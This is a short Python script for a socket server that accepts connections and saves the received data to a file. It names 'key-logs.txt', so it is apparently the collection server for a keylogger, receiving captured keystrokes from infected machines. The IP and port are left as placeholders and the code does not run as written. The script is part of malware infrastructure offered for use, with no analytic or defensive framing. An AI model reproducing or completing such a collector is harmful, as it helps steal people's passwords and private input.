import socket
import sys

files = ['key-logs.txt']

s = socket.socket()
s.bind(("ip",port))  # edit server ip and port here
s.listen(10)


while True:
    sc, address = s.accept()

    print('Got connection from: ',address)
    
    f = open('server-copy.txt','wb') # open in binary    
    for i in range(len(files)):
        l = sc.recv(1024)
        f.write(l)    
    f.close()
    sc.close()

s.close()
